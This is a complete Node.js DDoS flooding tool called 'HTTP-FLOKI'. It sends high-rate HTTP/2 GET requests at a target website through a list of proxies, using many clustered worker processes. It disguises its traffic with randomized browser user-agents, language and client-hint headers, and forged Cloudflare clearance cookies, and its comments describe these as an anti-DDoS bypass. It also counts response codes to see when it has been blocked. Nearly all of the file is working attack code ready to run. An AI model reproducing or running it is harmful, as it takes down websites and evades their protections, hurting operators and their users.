const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

// Full language header array
const lang_header = [
  "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
  "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
  "en-US,en;q=0.5", "en-US,en;q=0.9",
  "de-CH;q=0.7",
  "da, en-gb;q=0.8, en;q=0.7",
  "cs;q=0.5",
  "en-GB,en;q=0.9",
  "en-CA,en;q=0.9",
  "en-AU,en;q=0.9",
  "en-NZ,en;q=0.9",
  "en-ZA,en;q=0.9",
  "en-IE,en;q=0.9",
  "en-IN,en;q=0.9",
  "ar-SA,ar;q=0.9",
  "az-Latn-AZ,az;q=0.9",
  "be-BY,be;q=0.9",
  "bg-BG,bg;q=0.9",
  "bn-IN,bn;q=0.9",
  "ca-ES,ca;q=0.9",
  "cs-CZ,cs;q=0.9",
  "cy-GB,cy;q=0.9",
  "da-DK,da;q=0.9",
  "de-DE,de;q=0.9",
  "el-GR,el;q=0.9",
  "es-ES,es;q=0.9",
  "et-EE,et;q=0.9",
  "eu-ES,eu;q=0.9",
  "fa-IR,fa;q=0.9",
  "fi-FI,fi;q=0.9",
  "fr-FR,fr;q=0.9",
  "ga-IE,ga;q=0.9",
  "gl-ES,gl;q=0.9",
  "gu-IN,gu;q=0.9",
  "he-IL,he;q=0.9",
  "hi-IN,hi;q=0.9",
  "hr-HR,hr;q=0.9",
  "hu-HU,hu;q=0.9",
  "hy-AM,hy;q=0.9",
  "id-ID,id;q=0.9",
  "is-IS,is;q=0.9",
  "it-IT,it;q=0.9",
  "ja-JP,ja;q=0.9",
  "ka-GE,ka;q=0.9",
  "kk-KZ,kk;q=0.9",
  "km-KH,km;q=0.9",
  "kn-IN,kn;q=0.9",
  "ko-KR,ko;q=0.9",
  "ky-KG,ky;q=0.9",
  "lo-LA,lo;q=0.9",
  "lt-LT,lt;q=0.9",
  "lv-LV,lv;q=0.9",
  "mk-MK,mk;q=0.9",
  "ml-IN,ml;q=0.9",
  "mn-MN,mn;q=0.9",
  "mr-IN,mr;q=0.9",
  "ms-MY,ms;q=0.9",
  "mt-MT,mt;q=0.9",
  "my-MM,my;q=0.9",
  "nb-NO,nb;q=0.9",
  "ne-NP,ne;q=0.9",
  "nl-NL,nl;q=0.9",
  "nn-NO,nn;q=0.9",
  "or-IN,or;q=0.9",
  "pa-IN,pa;q=0.9",
  "pl-PL,pl;q=0.9",
  "pt-BR,pt;q=0.9",
  "pt-PT,pt;q=0.9",
  "ro-RO,ro;q=0.9",
  "ru-RU,ru;q=0.9",
  "si-LK,si;q=0.9",
  "sk-SK,sk;q=0.9",
  "sl-SI,sl;q=0.9",
  "sq-AL,sq;q=0.9",
  "sr-Cyrl-RS,sr;q=0.9",
  "sr-Latn-RS,sr;q=0.9",
  "sv-SE,sv;q=0.9",
  "sw-KE,sw;q=0.9",
  "ta-IN,ta;q=0.9",
  "te-IN,te;q=0.9",
  "th-TH,th;q=0.9",
  "tr-TR,tr;q=0.9",
  "uk-UA,uk;q=0.9",
  "ur-PK,ur;q=0.9",
  "uz-Latn-UZ,uz;q=0.9",
  "vi-VN,vi;q=0.9",
  "zh-CN,zh;q=0.9",
  "zh-HK,zh;q=0.9",
  "zh-TW,zh;q=0.9",
  "am-ET,am;q=0.8",
  "as-IN,as;q=0.8",
  "az-Cyrl-AZ,az;q=0.8",
  "bn-BD,bn;q=0.8",
  "bs-Cyrl-BA,bs;q=0.8",
  "bs-Latn-BA,bs;q=0.8",
  "dz-BT,dz;q=0.8",
  "fil-PH,fil;q=0.8",
  "fr-CA,fr;q=0.8",
  "fr-CH,fr;q=0.8",
  "fr-BE,fr;q=0.8",
  "fr-LU,fr;q=0.8",
  "gsw-CH,gsw;q=0.8",
  "ha-Latn-NG,ha;q=0.8",
  "hr-BA,hr;q=0.8",
  "ig-NG,ig;q=0.8",
  "ii-CN,ii;q=0.8",
  "is-IS,is;q=0.8",
  "jv-Latn-ID,jv;q=0.8",
  "ka-GE,ka;q=0.8",
  "kkj-CM,kkj;q=0.8",
  "kl-GL,kl;q=0.8",
  "km-KH,km;q=0.8",
  "kok-IN,kok;q=0.8",
  "ks-Arab-IN,ks;q=0.8",
  "lb-LU,lb;q=0.8",
  "ln-CG,ln;q=0.8",
  "mn-Mong-CN,mn;q=0.8",
  "mr-MN,mr;q=0.8",
  "ms-BN,ms;q=0.8",
  "mt-MT,mt;q=0.8",
  "mua-CM,mua;q=0.8",
  "nds-DE,nds;q=0.8",
  "ne-IN,ne;q=0.8",
  "nso-ZA,nso;q=0.8",
  "oc-FR,oc;q=0.8",
  "pa-Arab-PK,pa;q=0.8",
  "ps-AF,ps;q=0.8",
  "quz-BO,quz;q=0.8",
  "quz-EC,quz;q=0.8",
  "quz-PE,quz;q=0.8",
  "rm-CH,rm;q=0.8",
  "rw-RW,rw;q=0.8",
  "sd-Arab-PK,sd;q=0.8",
  "se-NO,se;q=0.8",
  "si-LK,si;q=0.8",
  "smn-FI,smn;q=0.8",
  "sms-FI,sms;q=0.8",
  "syr-SY,syr;q=0.8",
  "tg-Cyrl-TJ,tg;q=0.8",
  "ti-ER,ti;q=0.8",
  "tk-TM,tk;q=0.8",
  "tn-ZA,tn;q=0.8",
  "tt-RU,tt;q=0.8",
  "ug-CN,ug;q=0.8",
  "uz-Cyrl-UZ,uz;q=0.8",
  "ve-ZA,ve;q=0.8",
  "wo-SN,wo;q=0.8",
  "xh-ZA,xh;q=0.8",
  "yo-NG,yo;q=0.8",
  "zgh-MA,zgh;q=0.8",
  "zu-ZA,zu;q=0.8",
];

const encoding_header = [
  "gzip, deflate, br",
  "compress, gzip",
  "deflate, gzip",
  "gzip, identity",
  "*",
];

// Website status tracking
const statusTracker = {
  totalRequests: 0,
  statusCounts: {},
  logStatus(code) {
    this.totalRequests++;
    this.statusCounts[code] = (this.statusCounts[code] || 0) + 1;
  },
  displayReport() {
    console.log("\n\x1b[1mWebsite Status Report:\x1b[0m");
    console.log(`Total Requests Sent: ${this.totalRequests}`);
    console.log("Status Breakdown:");
    for (const [code, count] of Object.entries(this.statusCounts)) {
      const message = this.getStatusMessage(code);
      console.log(`- ${code}: ${count} (${message})`);
    }
  },
  getStatusMessage(code) {
    const messages = {
      200: "OK",
      201: "Created",
      301: "Moved Permanently",
      302: "Found",
      400: "Bad Request",
      401: "Unauthorized",
      403: "Forbidden",
      404: "Not Found",
      429: "Too Many Requests",
      500: "Internal Server Error",
      502: "Bad Gateway",
      503: "Service Unavailable",
    };
    return messages[code] || "Unknown Status";
  },
};

// Low-spec resource limits
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

// Command-line args
if (process.argv.length < 7) {
  console.log("Usage: node HTTP-FLOKI target time rate threads proxy.txt");
  console.log("Example: node HTTP-FLOKI https://example.com 60 1000 4 proxies.txt");
  process.exit();
}

const args = {
  target: process.argv[2],
  time: ~~process.argv[3],
  rate: ~~process.argv[4] * 5, // Quintuple rate
  threads: Math.min(~~process.argv[5], 8), // Cap at 8
  proxyFile: process.argv[6],
};

// Utility functions
function readLines(filePath) {
  try {
    const data = fs.readFileSync(filePath, "utf-8");
    return data.split(/\r?\n/).filter(line => line.length > 0);
  } catch (e) {
    console.log(`Proxy file error: ${e.message}`);
    process.exit();
  }
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length - 1)];
}

function generateRandomString(length) {
  return crypto.randomBytes(length).toString("hex").slice(0, length);
}

function getWorkingProxy(proxies, usedProxies = new Set()) {
  let proxy;
  do {
    proxy = randomElement(proxies);
  } while (usedProxies.has(proxy) && usedProxies.size < proxies.length);
  usedProxies.add(proxy);
  return proxy;
}

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
const usedProxies = new Set();

// Cluster setup
if (cluster.isMaster) {
  console.clear();
  console.log('\x1b[34mTarget: ' + parsedTarget.host + '\x1b[0m');
  console.log('\x1b[33mDuration: ' + args.time + ' seconds\x1b[0m');
  console.log('\x1b[32mThreads: ' + args.threads + ' (low-spec optimized)\x1b[0m');
  console.log('\x1b[31mRequests per second: ' + args.rate + '\x1b[0m');
  console.log('\x1b[36mTotal Power: ' + (args.rate * args.threads) + ' req/s\x1b[0m');

  for (let counter = 1; counter <= args.threads; counter++) {
    console.log(`Starting thread ${counter}...`);
    cluster.fork();
  }

  setTimeout(() => {
    statusTracker.displayReport();
    console.log('\x1b[35mExecution completed.\x1b[0m');
    process.exit(1);
  }, args.time * 1000);
} else {
  setImmediate(() => runFlooder(true));
}

if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
}

// NetSocket class
class NetSocket {
  constructor() {
    this.options = {};
  }

  HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = Buffer.from(payload);

    const connection = net.connect({
      host: options.host,
      port: options.port,
      allowHalfOpen: true,
      writable: true,
      readable: true,
    });

    connection.setTimeout(options.timeout * 1000);
    connection.setNoDelay(true);

    connection.on("connect", () => {
      connection.write(buffer);
    });

    connection.on("data", chunk => {
      const response = chunk.toString("utf-8");
      const isAlive = response.includes("HTTP/1.1 200");
      if (!isAlive) {
        connection.destroy();
        return callback(undefined, "Invalid proxy response");
      }
      return callback(connection, undefined);
    });

    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "Timeout exceeded");
    });

    connection.on("error", (err) => {
      connection.destroy();
      return callback(undefined, `Connection error: ${err.message}`);
    });
  }
}

// User-Agent generator
function getRandomUserAgent() {
  const osList = ["Windows NT 10.0", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"];
  const browserList = ["Chrome", "Firefox", "Safari"];
  const os = randomElement(osList);
  const browser = randomElement(browserList);
  const version = `${randomIntn(90, 120)}.0.${randomIntn(0, 9999)}.${randomIntn(0, 99)}`;
  return `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) ${browser}/${version} Safari/537.36`;
}

// Header generator for anti-DDoS bypass
function getHeaders() {
  const headers = {};
  headers[":method"] = "GET";
  headers[":path"] = parsedTarget.path || "/";
  headers[":scheme"] = "https";
  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = getRandomUserAgent();
  headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
  headers["accept-encoding"] = randomElement(encoding_header);
  headers["accept-language"] = randomElement(lang_header);
  headers["sec-ch-ua"] = `"Not A;Brand";v="99", "Chromium";v="${randomIntn(90, 120)}", "Google Chrome";v="${randomIntn(90, 120)}"`;
  headers["sec-ch-ua-mobile"] = "?0";
  headers["sec-ch-ua-platform"] = '"Windows"';
  headers["sec-fetch-dest"] = "document";
  headers["sec-fetch-mode"] = "navigate";
  headers["sec-fetch-site"] = "none";
  headers["sec-fetch-user"] = "?1";
  headers["referer"] = `https://${parsedTarget.host}/`;
  headers["cookie"] = `cf_clearance=${generateRandomString(40)}; _ga=GA1.2.${randomIntn(1000, 9999)}.${randomIntn(1000000, 9999999)}`;
  headers["connection"] = "keep-alive";
  headers["upgrade-insecure-requests"] = "1";
  headers["pragma"] = "no-cache";
  headers["cache-control"] = "no-cache";
  return headers;
}

// Connection optimizer
function optimizeConnection(connection) {
  connection.setKeepAlive(true, 60000);
  connection.setNoDelay(true);
  connection.setTimeout(5000);
  return connection;
}

// Flooder function with status tracking
function runFlooder(repeat = false) {
  const proxyAddr = getWorkingProxy(proxies, usedProxies);
  const parsedProxy = proxyAddr.split(":");
  const headerInstance = new NetSocket();

  const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: parsedTarget.host + ":443",
    timeout: 5,
  };

  headerInstance.HTTP(proxyOptions, (connection, error) => {
    if (error) {
      console.log(`Proxy ${proxyAddr} failed: ${error}`);
      return repeat && setTimeout(() => runFlooder(true), 50);
    }

    optimizeConnection(connection);

    const tlsOptions = {
      ALPNProtocols: ["h2"],
      echdCurve: "GREASE:X25519",
      ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256",
      rejectUnauthorized: false,
      socket: connection,
      honorCipherOrder: true,
      secure: true,
      port: 443,
      uri: parsedTarget.host,
      servername: parsedTarget.host,
      secureProtocol: "TLSv1_3_method",
      secureOptions: crypto.constants.SSL_OP_NO_SSLv2 |
                     crypto.constants.SSL_OP_NO_SSLv3 |
                     crypto.constants.SSL_OP_NO_TLSv1,
    };

    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
    optimizeConnection(tlsConn);

    const client = http2.connect(parsedTarget.href, {
      protocol: "https:",
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 5000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false,
      },
      maxSessionMemory: 128000,
      createConnection: () => tlsConn,
      socket: connection,
    });

    client.on("connect", () => {
      console.log(`Connected via ${proxyAddr}`);
    });

    client.on("error", (err) => {
      console.log(`Client error: ${err.message}`);
      client.destroy();
      connection.destroy();
    });

    client.on("close", () => {
      client.destroy();
      connection.destroy();
    });

    const attackInterval = setInterval(() => {
      for (let i = 0; i < args.rate; i++) {
        const request = client.request(getHeaders());
        request.on("response", (response) => {
          const status = response[":status"];
          statusTracker.logStatus(status);
          console.log(`Response from ${parsedTarget.host}: ${status} (${statusTracker.getStatusMessage(status)})`);
          if (status === 403 || status === 503 || status === 429) {
            console.log(`Anti-DDoS block detected (${status})`);
            client.destroy();
            connection.destroy();
          }
          request.close();
          request.destroy();
        });
        request.on("error", () => {
          statusTracker.logStatus("Error");
        });
        request.end();
      }
    }, 100);

    setTimeout(() => {
      clearInterval(attackInterval);
      client.destroy();
      connection.destroy();
      if (repeat) setTimeout(() => runFlooder(true), 50);
    }, args.time * 1000);
  });
}

// Error handling
process.on("uncaughtException", (exception) => {
  console.log(`Uncaught exception: ${exception.message}`);
});

process.on("unhandledRejection", (reason) => {
  console.log(`Unhandled rejection: ${reason}`);
});

// Kill script
const KillScript = () => {
  statusTracker.displayReport();
  console.log("Script terminated.");
  process.exit(1);
};

setTimeout(KillScript, args.time * 1000);